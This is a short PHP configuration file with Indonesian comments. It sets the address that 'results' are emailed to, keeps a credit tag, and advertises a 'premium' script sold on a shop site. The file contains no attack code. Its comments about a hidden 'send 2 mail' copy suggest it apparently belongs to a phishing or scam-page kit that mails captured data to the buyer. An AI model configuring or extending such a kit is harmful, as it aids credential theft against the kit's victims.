<?php

$pulberaja = 'pulberaja5@gmail.com'; // GANTI EMAIL KAMU DISINI


$pembuat = 'PulberAja'; //Jangan di hapus kalo gak mau rusak
?>

<!-- Buatan PulberAja, kalo mau sc yang send 2 mail silahkan download di tokopulberaja.com ya. saya gak mau kalo server kalian abuse karena send 2 mail -->

<?php
$tutorial = 'BERGUNA LAH'

// Bila ingin tahu send 2 mail tidak nya silahkan cek di Track Delivery di cPanel agar tau anda para perusak reputasi yang bialng send 2 mail
// Premium SC with PulberAja
// Pembuat: Nanang
?>